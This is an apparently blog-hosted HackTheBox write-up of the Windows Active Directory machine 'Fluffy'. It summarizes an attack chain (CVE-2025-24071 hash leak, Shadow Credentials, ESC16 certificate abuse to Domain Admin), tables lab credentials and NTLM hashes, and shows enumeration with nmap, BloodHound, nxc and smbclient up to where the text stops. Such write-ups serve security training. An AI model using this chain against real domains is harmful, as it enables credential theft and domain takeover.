---
layout: ctf
title: "HackTheBox: Fluffy"
platform: "HackTheBox"
type: "Machine"
difficulty: "Easy"
image: "/assets/img/ctf/fluffy.png"
tags: [Windows, CVE-2025-24071, Shadow-Credentials, ESC16, ACL-Abuse, Active-Directory]
date: 2026-05-11
---

# 🎯 Fluffy

**OS:** Windows | **Difficulty:** Easy | **IP:** `10.129.43.160`

![fluffy.htb](/assets/img/ctf/data/fluffy-htb.png)

---

## ⛓️ TL;DR / Attack Chain
1. CVE-2025-24071: Abused `WRITE` permission of user `j.fleischman` over `IT` share in order to upload a malicious `.zip` file containing a `.library-ms` file that reveals the NTLM hash of `p.agila`.
2. GenericAll: User `p.agila` is member of `SERVICE ACCOUNT MANAGERS` who have `GenericAll` over `SERVICE ACCOUNTS`, including `CA_SVC`. Performed a Shadow Credentials Attack on `CA_SVC` in order to get its NTLM hash.
3. ESC16: Escalated privileges from `CA_SVC` to Domain Admin abusing the `ESC16` certificate misconfiguration.

---

## 🔑 Loot & Creds

| User | Credential | Where / How |
| :--- | :--- | :--- |
| `j.fleischman` | `J0elTHEM4n1990!` | We start with these credentials |
| `p.agila` | `prometheusx-303` | Cracked NTLM hash retrieved via CVE-2025-24071 |
| `WINRM_SVC` | `33bd09dcd697600edf6b3a7af4875767` | Shadow Attack using `p.agila` |
| `CA_SVC` | `ca0f4f9e9eb8a092addf53bb03fc98c8` | Shadow Attack using `p.agila` |
| `Administrator` | `8da83a3fa618b6e3a00e93f676c92a6e` | ESC16 Misconfig Exploitation as `CA_SVC` |

---

## 🔧 0. Setup & Global Variables
*Run this in your terminal once so you can copy-paste the rest of the commands blindly.*

```bash
$ IP="10.129.43.160" ; DOMAIN="fluffy.htb" ; USERNAME="j.fleischman" ; PASSWORD='J0elTHEM4n1990!'

$ echo "$IP $DOMAIN dc.fluffy.htb DC01.FLUFFY.HTB FLUFFY.HTB dc01.fluffy.htb DC01.fluffy.htb" | sudo tee -a /etc/hosts
```

---

## 🔍 1. Enumeration

### Nmap
```bash
$ mkdir nmap && nmap -sV -sC -p- -T5 -vv $IP -oA ./nmap

Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-11 15:23 +0200

<SNIP>

Nmap scan report for fluffy.htb (10.129.43.160)
Host is up, received echo-reply ttl 127 (0.020s latency).
Scanned at 2026-05-11 15:23:35 CEST for 155s
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-05-11 20:24:39Z)
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-11T20:26:08+00:00; +6h59m58s from scanner time.
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-11T20:26:08+00:00; +6h59m58s from scanner time.
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-11T20:26:08+00:00; +6h59m58s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: fluffy.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fluffy.htb, DNS:fluffy.htb, DNS:FLUFFY
| Issuer: commonName=fluffy-DC01-CA/domainComponent=fluffy
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-04-30T16:09:59
| Not valid after:  2106-04-30T16:09:59
| MD5:     f5e3 ec00 5fd1 2a95 a76b 2fd6 4726 4d67
| SHA-1:   6867 9230 5123 dcf1 9352 e081 4148 7fef 13c7 6c0a
| SHA-256: a90d f4d0 6fe1 9052 822e 708e 65e8 2c70 24d5 8ef7 692a b346 da07 47d5 d81f 36ee
| -----BEGIN CERTIFICATE-----
| MIIFmjCCBIKgAwIBAgITUAAAABHyG6GZUVLpIQACAAAAETANBgkqhkiG9w0BAQsF
| ADBGMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGZmx1ZmZ5
| MRcwFQYDVQQDEw5mbHVmZnktREMwMS1DQTAgFw0yNjA0MzAxNjA5NTlaGA8yMTA2
| MDQzMDE2MDk1OVowADCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALvc
| 1vZo317xTcxldcffWWYLJsYtKuaYnf+etebicPU9eZc55NFzBQyfCM6BWPjbLuDQ
| 0FFQFnQvYfKCNfX40kuxVKnW9VQm/dSJUfzt2Uz93GYKJEaJlQPDEFTKJdBaJTq1
| BE13EzR389j8uBPDB+P8sVHSXau1IPspyB+UYWQUt4hGt5hOU6yydjao/d4B8LOl
| OZGpnKr6ox67GWLqwCfoj8It/vSUN3xeFn3yFDqkI/RNhVF7fiqPYnad1nwycicV
| tBPYKeOP6ZXFfqJs5lJLsLt8J708//iS28dEXFi4yUog+jNAuGf53QNuTviVbILG
| SdPVr9IBpNh5zNlM9kkCAwEAAaOCAsMwggK/MDcGCSsGAQQBgjcVBwQqMCgGICsG
| AQQBgjcVCIfOj3KD0etwhvWLD4Loh37CjReBWwEhAgFuAgEAMDIGA1UdJQQrMCkG
| CCsGAQUFBwMCBggrBgEFBQcDAQYKKwYBBAGCNxQCAgYHKwYBBQIDBTAOBgNVHQ8B
| Af8EBAMCBaAwQAYJKwYBBAGCNxUKBDMwMTAKBggrBgEFBQcDAjAKBggrBgEFBQcD
| ATAMBgorBgEEAYI3FAICMAkGBysGAQUCAwUwHQYDVR0OBBYEFMG/WiZX49X4GWpl
| oVa+O9XP64DrMB8GA1UdIwQYMBaAFLZo6VUJI0gwnx+vL8f7rAgMKn0RMIHIBgNV
| HR8EgcAwgb0wgbqggbeggbSGgbFsZGFwOi8vL0NOPWZsdWZmeS1EQzAxLUNBLENO
| PURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZp
| Y2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0Yj9jZXJ0aWZpY2F0
| ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9u
| UG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGsBggrBgEFBQcwAoaBn2xkYXA6Ly8v
| Q049Zmx1ZmZ5LURDMDEtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Zmx1ZmZ5LERDPWh0
| Yj9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1
| dGhvcml0eTAxBgNVHREBAf8EJzAlgg9EQzAxLmZsdWZmeS5odGKCCmZsdWZmeS5o
| dGKCBkZMVUZGWTANBgkqhkiG9w0BAQsFAAOCAQEATryg0q2I2eVmPNwkxBcsaUFD
| 0s/p3kv/aOCGB9Wv7TpLP+2WjPRBnGCg9JgrFSL6mvbTyvmftSrxyzGMbbMOyhs5
| zCJrNE0ewzVeWtkE4HJx4P1rbrR1DvTmoZPKZ5y0NTQGCeHzM9vR8nVnFtMByHpG
| /F3ReiaILeHnvRDVNjyd/uDkOu+mYNZ9k7kZLvMynM55YfizS6ZLXSqqVtLzUJev
| l3szUURWnNtESHGkGrrclYaWakB3CO1ygkTTjV5O1UNj2V38wN8wgNX7Pys771PQ
| mmZJw5lCPljYhiN3Rh/8vUlg6IQlJEsyAJL1Y9MuaTJOuyf2PZPCJURtKhgdiA==
|_-----END CERTIFICATE-----
|_ssl-date: 2026-05-11T20:26:08+00:00; +6h59m58s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49689/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49698/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49714/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49749/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 32564/tcp): CLEAN (Timeout)
|   Check 2 (port 56579/tcp): CLEAN (Timeout)
|   Check 3 (port 27142/udp): CLEAN (Timeout)
|   Check 4 (port 63938/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-05-11T20:25:30
|_  start_date: N/A
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:26
Completed NSE at 15:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:26
Completed NSE at 15:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:26
Completed NSE at 15:26, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.38 seconds
           Raw packets sent: 131092 (5.768MB) | Rcvd: 56 (2.448KB)
```

### Bloodhound

```bash
$ bloodhound-python -u $USERNAME -p $PASSWORD -d $DOMAIN -ns $IP -c All --zip

INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: fluffy.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::e7c1:d24f:bda:5332
INFO: Trying LDAP connection to dead:beef::e7c1:d24f:bda:5332
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.fluffy.htb
INFO: Testing resolved hostname connectivity dead:beef::e7c1:d24f:bda:5332
INFO: Trying LDAP connection to dead:beef::e7c1:d24f:bda:5332
INFO: Found 10 users
INFO: Found 54 groups
INFO: Found 3 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.fluffy.htb
INFO: Done in 00M 05S
INFO: Compressing output into 20260511153716_bloodhound.zip
```

Interesting Group:
![fluffy-1](/assets/img/ctf/data/fluffy-1.png)

![fluffy-2](/assets/img/ctf/data/fluffy-2.png)

![fluffy-3](/assets/img/ctf/data/fluffy-3.png)

![fluffy-4](/assets/img/ctf/data/fluffy-4.png)

### SMB

```bash
$ nxc smb $IP -u $USERNAME -p $PASSWORD -M spider_plus -o DOWNLOAD_FLAG=True

SMB         10.129.43.160   445    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.43.160   445    DC01             [+] fluffy.htb\j.fleischman:J0elTHEM4n1990!
SPIDER_PLUS 10.129.43.160   445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_PLUS 10.129.43.160   445    DC01             [*]  DOWNLOAD_FLAG: True
SPIDER_PLUS 10.129.43.160   445    DC01             [*]     STATS_FLAG: True
SPIDER_PLUS 10.129.43.160   445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.43.160   445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_PLUS 10.129.43.160   445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_PLUS 10.129.43.160   445    DC01             [*]  OUTPUT_FOLDER: /home/tralsesec/.nxc/modules/nxc_spider_plus
SMB         10.129.43.160   445    DC01             [*] Enumerated shares
SMB         10.129.43.160   445    DC01             Share           Permissions     Remark
SMB         10.129.43.160   445    DC01             -----           -----------     ------
SMB         10.129.43.160   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.43.160   445    DC01             C$                              Default share
SMB         10.129.43.160   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.43.160   445    DC01             IT              READ,WRITE
SMB         10.129.43.160   445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.43.160   445    DC01             SYSVOL          READ            Logon server share
SPIDER_PLUS 10.129.43.160   445    DC01             [+] Saved share-file metadata to "/home/tralsesec/.nxc/modules/nxc_spider_plus/10.129.43.160.json".
SPIDER_PLUS 10.129.43.160   445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.43.160   445    DC01             [*] SMB Readable Shares:  4 (IPC$, IT, NETLOGON, SYSVOL)
SPIDER_PLUS 10.129.43.160   445    DC01             [*] SMB Writable Shares:  1 (IT)
SPIDER_PLUS 10.129.43.160   445    DC01             [*] SMB Filtered Shares:  1
SPIDER_PLUS 10.129.43.160   445    DC01             [*] Total folders found:  30
SPIDER_PLUS 10.129.43.160   445    DC01             [*] Total files found:    29
SPIDER_PLUS 10.129.43.160   445    DC01             [*] Files filtered:       11
SPIDER_PLUS 10.129.43.160   445    DC01             [*] File size average:    489.15 KB
SPIDER_PLUS 10.129.43.160   445    DC01             [*] File size min:        23 B
SPIDER_PLUS 10.129.43.160   445    DC01             [*] File size max:        3.15 MB
SPIDER_PLUS 10.129.43.160   445    DC01             [*] File unique exts:     14 (dll, pol, ini, cmtx, pdf, inf, zip, exe, config, txt...)
SPIDER_PLUS 10.129.43.160   445    DC01             [*] Downloads successful: 18
SPIDER_PLUS 10.129.43.160   445    DC01             [+] All files processed successfully.
```

```bash
$ cd ~/.nxc/modules/nxc_spider_plus/$IP

$ ls
IT  SYSVOL

$ ls IT
KeePass-2.58

$ cd IT/KeePass-2.58/

$ ls
KeePass.exe.config  License.txt  XSL
```

KeePass 2.58 is vulnerable [CVE-2023-24055](https://github.com/alt3kx/CVE-2023-24055_PoC).

> For some reason `nxc` decided to not download the entire contents of the `IT` share. That's why we have to check it manually:
{: .warning}

```bash
$ smbclient "//$IP/IT" -U "$USERNAME%$PASSWORD"

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon May 11 23:06:16 2026
  ..                                  D        0  Mon May 11 23:06:16 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 17:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 17:04:05 2025
  KeePass-2.58                        D        0  Mon May 11 22:54:25 2026
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 17:03:17 2025
  Upgrade_Notice.pdf                  A   169963  Sat May 17 16:31:07 2025

		5842943 blocks of size 4096. 2022940 blocks available
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (512.3 KiloBytes/sec) (average 512.3 KiloBytes/sec)
smb: \> get Everything-1.4.1.1026.x64.zip
